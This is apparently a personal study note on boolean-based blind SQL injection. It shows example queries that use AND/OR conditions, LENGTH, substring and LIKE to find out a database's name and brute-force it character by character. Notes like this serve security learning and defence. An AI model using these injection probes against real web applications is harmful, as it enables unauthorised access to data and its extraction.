---
tags:
  - security
  - sqli
  - web
title: BOOLEAN based (Blind) Injection
date: 2024-01-28 14:15:56 -0600
updated: 2024-01-28 14:15:56 -0600
---

If the 1st part of the where clause is correct we can use the AND operator to get result

````sql
SELECT * 
FROM users 
WHERE id=1 AND database()="sbva";
````

If the 1st part of the where clause is wrong we can use the OR operator to get result

````sql
SELECT * 
FROM users 
WHERE id=2 OR database()="sbva";
````

### Finding Database Name
``
#### Find Length of Name

````sql
SELECT * 
FROM users 
WHERE id=2 OR LENGTH(database())="1";
````

#### Brute Force the Characters

```sql
SELECT * 
FROM users 
WHERE id=2 OR substring(database(), 1, 1)="s";

SELECT * 
FROM users 
WHERE id=2 or substring(database(), 2, 1)="s";
```

#### Try to Find Matching Pattern

```sql
SELECT * 
FROM users 
WHERE id=2 OR database() LIKE "%s%";
```
